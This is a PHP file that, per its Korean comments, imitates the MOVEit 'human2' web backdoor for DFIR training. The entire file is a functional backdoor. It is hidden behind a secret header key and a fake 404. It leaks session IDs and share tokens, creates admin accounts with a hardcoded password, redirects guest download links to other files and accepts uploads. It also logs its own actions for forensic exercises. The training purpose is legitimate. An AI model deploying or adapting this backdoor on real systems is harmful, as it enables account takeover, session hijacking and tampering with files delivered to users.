<?php
/*
 * MOVEit 사례를 참고해 백도어 동작을 흉내 낸 교육용 프로그램입니다.
 * 기능은 애플리케이션과 데이터베이스(DB) 작업으로 제한합니다.
 * 운영체제 명령을 실행하거나 새 프로세스(실행 중인 프로그램)를 만들지 않습니다.
 */

require_once '/var/www/src/db.php';

header('Content-Type: application/json; charset=utf-8');

const DEMO_KEY = 'execute';
const DEMO_PASSWORD = 'Temp1234!';

$key = $_SERVER['HTTP_X_MFT_KEY'] ?? '';

if (!hash_equals(DEMO_KEY, $key)) {
    http_response_code(404);
    echo json_encode(
        ['error' => 'not found'],
        JSON_UNESCAPED_UNICODE
    );
    exit;
}

$action = $_GET['action'] ?? 'list';

try {
    switch ($action) {

        /*
         * GET /human2.php?action=list
         *
         * MFT(관리형 파일 전송) 서비스에 저장된 파일 목록을 조회합니다.
         */
        case 'list':
            $sql = "
                SELECT
                    f.id,
                    f.owner_id,
                    u.username AS owner,
                    f.original_name,
                    f.storage_name,
                    f.created_at
                FROM files f
                JOIN users u ON u.id = f.owner_id
                ORDER BY f.id
            ";

            $rows = db()->query($sql)->fetchAll();

            echo json_encode(
                $rows,
                JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
            );
            exit;


        /*
         * GET /human2.php?action=users
         *
         * 애플리케이션의 사용자 목록을 조회합니다.
         * 비밀번호 해시(비밀번호 검증을 위해 변환해 저장한 값)는 응답에 포함하지 않습니다.
         */
        case 'users':
            $sql = "
                SELECT
                    id,
                    username,
                    role,
                    created_at
                FROM users
                ORDER BY id
            ";

            $rows = db()->query($sql)->fetchAll();

            echo json_encode(
                $rows,
                JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
            );
            exit;

        /*
         * GET /human2.php?action=sessions
         *
         * 교육용으로 DB에 저장된 세션(사용자의 로그인 상태를 관리하는 정보)을 조회합니다.
         */
        case 'sessions':
            $sql = "
                SELECT
                    s.session_id,
                    s.user_id,
                    u.username,
                    u.role,
                    s.expires_at
                FROM sessions s
                JOIN users u ON u.id = s.user_id
                ORDER BY s.expires_at DESC
            ";

            $rows = db()->query($sql)->fetchAll();

            echo json_encode(
                $rows,
                JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
            );
            exit;


        /*
         * GET /human2.php?action=shares
         *
         * Guest Download(게스트 다운로드)의 공유 링크와 파일이 어떻게 연결되어 있는지 조회합니다.
         */
        case 'shares':
            $sql = "
                SELECT
                    s.id AS share_id,
                    s.file_id,
                    f.original_name,
                    f.storage_name,
                    s.token,
                    s.active
                FROM shares s
                JOIN files f ON f.id = s.file_id
                ORDER BY s.id
            ";

            $rows = db()->query($sql)->fetchAll();

            echo json_encode(
                $rows,
                JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
            );
            exit;
        
        /*
         * GET /human2.php?action=files
         *
         * 현재 업로드 된 파일을 조회하고, 공유 링크와 어떻게 연결되어 있는지 조회합니다.
         */
        case 'files':
            $sql = "
                SELECT
                    f.id AS file_id,
                    f.original_name,
                    f.storage_name,
                    s.id AS share_id,
                    s.token,
                    s.active
                FROM files f
                LEFT JOIN shares s ON s.file_id = f.id
                ORDER BY f.id;
            ";

            $rows = db()->query($sql)->fetchAll();

            echo json_encode(
                $rows,
                JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
            );
            exit;

        /*
         * GET /human2.php?action=create_user&name=svc_backup
         *
         * 교육용 관리자 계정을 생성합니다.
         * 비밀번호: Temp1234!
         */
        case 'create_user':
            $name = trim($_GET['name'] ?? 'svc_backup');

            if ($name === '') {
                http_response_code(400);
                echo json_encode(
                    ['error' => 'username required'],
                    JSON_UNESCAPED_UNICODE
                );
                exit;
            }

            if (strlen($name) > 64) {
                http_response_code(400);
                echo json_encode(
                    ['error' => 'username too long'],
                    JSON_UNESCAPED_UNICODE
                );
                exit;
            }

            $check = db()->prepare("
                SELECT id, username, role
                FROM users
                WHERE username = ?
            ");

            $check->execute([$name]);

            if ($check->fetch()) {
                http_response_code(409);
                echo json_encode(
                    [
                        'error' => 'user already exists',
                        'username' => $name
                    ],
                    JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
                );
                exit;
            }

            $hash = password_hash(
                DEMO_PASSWORD,
                PASSWORD_BCRYPT
            );

            $st = db()->prepare("
                INSERT INTO users (
                    username,
                    password_hash,
                    role
                )
                VALUES (?, ?, 'admin')
            ");

            $st->execute([
                $name,
                $hash
            ]);

            echo json_encode(
                [
                    'created' => true,
                    'id' => (int) db()->lastInsertId(),
                    'username' => $name,
                    'role' => 'admin',
                    'demo_password' => DEMO_PASSWORD
                ],
                JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
            );
            exit;


        case 'replace_share':
            /*
             * GET /human2.php?action=replace_share
             *     &token=<공유 토큰>
             *     &file_id=<새로 연결할 파일 ID>
             *
             * 기존 Guest Download 공유 링크가 가리키는 파일을
             * MFT DB에 이미 등록된 다른 파일로 변경합니다.
             */

            $token = trim($_GET['token'] ?? '');
            $newFileId = (int) ($_GET['file_id'] ?? 0);

            if ($token === '' || $newFileId <= 0) {
                http_response_code(400);

                echo json_encode(
                    [
                        'error' => 'token and valid file_id are required'
                    ],
                    JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
                );
                exit;
            }

            /*
             * 새로 연결할 파일이 DB에 등록되어 있는지 확인합니다.
             */
            $fileCheck = db()->prepare("
        SELECT
            id,
            owner_id,
            original_name,
            storage_name
        FROM files
        WHERE id = ?
    ");

            $fileCheck->execute([$newFileId]);

            $targetFile = $fileCheck->fetch();

            if (!$targetFile) {
                http_response_code(404);

                echo json_encode(
                    [
                        'error' => 'target file not found',
                        'file_id' => $newFileId
                    ],
                    JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
                );
                exit;
            }

            /*
             * 현재 공유 링크에 연결된 파일 정보를 조회합니다.
             */
            $shareCheck = db()->prepare("
        SELECT
            s.id,
            s.file_id,
            s.token,
            s.active,
            f.original_name,
            f.storage_name
        FROM shares s
        JOIN files f ON f.id = s.file_id
        WHERE s.token = ?
        LIMIT 1
    ");

            $shareCheck->execute([$token]);

            $currentShare = $shareCheck->fetch();

            if (!$currentShare) {
                http_response_code(404);

                echo json_encode(
                    [
                        'error' => 'share not found'
                    ],
                    JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
                );
                exit;
            }

            $oldFileId = (int) $currentShare['file_id'];

            /*
             * 공유 링크에 연결된 파일을 변경합니다.
             */
            $update = db()->prepare("
        UPDATE shares
        SET file_id = ?
        WHERE token = ?
    ");

            $update->execute([
                $newFileId,
                $token
            ]);

            /*
             * DFIR(디지털 포렌식 및 침해사고 대응) 실습에서 변경 내역을 추적할 수 있도록
             * 애플리케이션의 감사 로그(작업 내역을 확인하는 기록)를 남깁니다.
             */
            $audit = db()->prepare("
        INSERT INTO audit_logs (
            username,
            event_type,
            target,
            remote_ip,
            success,
            detail
        )
        VALUES (?, ?, ?, ?, ?, ?)
    ");

            $audit->execute([
                'human2',
                'SHARE_TARGET_CHANGE',
                $token,
                $_SERVER['REMOTE_ADDR'] ?? null,
                1,
                sprintf(
                    'share file_id changed from %d to %d',
                    $oldFileId,
                    $newFileId
                )
            ]);

            echo json_encode(
                [
                    'changed' => true,
                    'share_id' => (int) $currentShare['id'],
                    'token' => $token,

                    'before' => [
                        'file_id' => $oldFileId,
                        'original_name' => $currentShare['original_name'],
                        'storage_name' => $currentShare['storage_name']
                    ],

                    'after' => [
                        'file_id' => (int) $targetFile['id'],
                        'original_name' => $targetFile['original_name'],
                        'storage_name' => $targetFile['storage_name']
                    ]
                ],
                JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
            );

            exit;

        case 'upload':
            /*
             * POST /human2.php?action=upload
             *
             * 요청 본문 형식: multipart/form-data(파일을 첨부하는 폼 전송 형식)
             * 파일 필드 이름: file
             *
             * 교육용 파일 업로드 기능입니다.
             * 파일은 미리 정해 둔 MFT 저장 폴더에만 저장합니다.
             * 파일 실행이나 요청자가 임의로 저장 경로를 지정하는 기능은 지원하지 않습니다.
             */

            if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
                http_response_code(405);

                echo json_encode(
                    ['error' => 'POST required'],
                    JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
                );
                exit;
            }

            if (
                !isset($_FILES['file']) ||
                $_FILES['file']['error'] !== UPLOAD_ERR_OK
            ) {
                http_response_code(400);

                echo json_encode(
                    ['error' => 'file upload required'],
                    JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
                );
                exit;
            }

            /*
             * 애플리케이션에서 사용할 고정된 파일 저장 폴더입니다.
             * 기존 MFT 애플리케이션이 다른 폴더에 파일을 저장한다면
             * 아래 경로를 해당 폴더에 맞게 변경해야 합니다.
             */
            $uploadDir = '/var/www/storage';

            if (!is_dir($uploadDir)) {
                if (!mkdir($uploadDir, 0750, true)) {
                    http_response_code(500);

                    echo json_encode(
                        ['error' => 'failed to create storage directory'],
                        JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
                    );
                    exit;
                }
            }

            /*
             * 업로드한 사용자가 보낸 원래 파일 이름을 가져옵니다.
             * basename()으로 경로 부분을 제거하고 파일 이름만 사용하여,
             * 파일 이름에 포함된 경로로 상위 폴더 등에 접근하는 것을 막습니다.
             */
            $originalName = basename($_FILES['file']['name']);

            if ($originalName === '') {
                http_response_code(400);

                echo json_encode(
                    ['error' => 'invalid filename'],
                    JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
                );
                exit;
            }

            /*
             * MFT 내부 저장용 파일 이름을 생성합니다.
             *
             * 예시:
             * f_a82b31c5e9012345.bin
             */
            $storageName = 'f_' . bin2hex(random_bytes(8)) . '.bin';

            $destination = $uploadDir . '/' . $storageName;

            /*
             * PHP가 임시로 보관한 업로드 파일을 MFT 저장 폴더로 옮깁니다.
             */
            if (
                !move_uploaded_file(
                    $_FILES['file']['tmp_name'],
                    $destination
                )
            ) {
                http_response_code(500);

                echo json_encode(
                    ['error' => 'failed to store uploaded file'],
                    JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
                );
                exit;
            }

            /*
             * svc_backup 계정이 있으면 업로드 파일의 소유자로 지정합니다.
             *
             * 일반적으로 이 업로드 작업 전에
             * /human2.php?action=create_user&name=svc_backup 요청으로 계정을 생성합니다.
             */
            $ownerQuery = db()->prepare("
        SELECT id, username
        FROM users
        WHERE username = ?
        LIMIT 1
    ");

            $ownerQuery->execute(['svc_backup']);

            $owner = $ownerQuery->fetch();

            /*
             * svc_backup 계정이 없으면 대신 admin 계정을 소유자로 사용합니다.
             */
            if (!$owner) {
                $ownerQuery = db()->prepare("
            SELECT id, username
            FROM users
            WHERE username = 'admin'
            LIMIT 1
        ");

                $ownerQuery->execute();

                $owner = $ownerQuery->fetch();
            }

            if (!$owner) {
                @unlink($destination);

                http_response_code(500);

                echo json_encode(
                    ['error' => 'no valid file owner found'],
                    JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
                );
                exit;
            }

            /*
             * 업로드한 파일 정보를 MFT DB에 등록합니다.
             */
            $insert = db()->prepare("
        INSERT INTO files (
            owner_id,
            original_name,
            storage_name
        )
        VALUES (?, ?, ?)
    ");

            $insert->execute([
                $owner['id'],
                $originalName,
                $storageName
            ]);

            $newFileId = (int) db()->lastInsertId();

            /*
             * DFIR(디지털 포렌식 및 침해사고 대응) 분석에서 업로드 내역을 확인할 수 있도록
             * 감사 로그를 남깁니다.
             */
            $audit = db()->prepare("
        INSERT INTO audit_logs (
            username,
            event_type,
            target,
            remote_ip,
            success,
            detail
        )
        VALUES (?, ?, ?, ?, ?, ?)
    ");

            $audit->execute([
                'human2',
                'BACKDOOR_FILE_UPLOAD',
                $originalName,
                $_SERVER['REMOTE_ADDR'] ?? null,
                1,
                sprintf(
                    'uploaded file_id=%d storage_name=%s owner=%s',
                    $newFileId,
                    $storageName,
                    $owner['username']
                )
            ]);

            echo json_encode(
                [
                    'uploaded' => true,
                    'file_id' => $newFileId,
                    'owner_id' => (int) $owner['id'],
                    'owner' => $owner['username'],
                    'original_name' => $originalName,
                    'storage_name' => $storageName
                ],
                JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
            );

            exit;

        default:
            http_response_code(400);

            echo json_encode(
                [
                    'error' => 'unknown action',
                    'available_actions' => [
                        'list',
                        'users',
                        'sessions',
                        'shares',
                        'create_user'
                    ]
                ],
                JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE
            );
            exit;
    }

} catch (PDOException $e) {
    http_response_code(500);

    echo json_encode(
        [
            'error' => 'database error'
        ],
        JSON_UNESCAPED_UNICODE
    );
    exit;
}

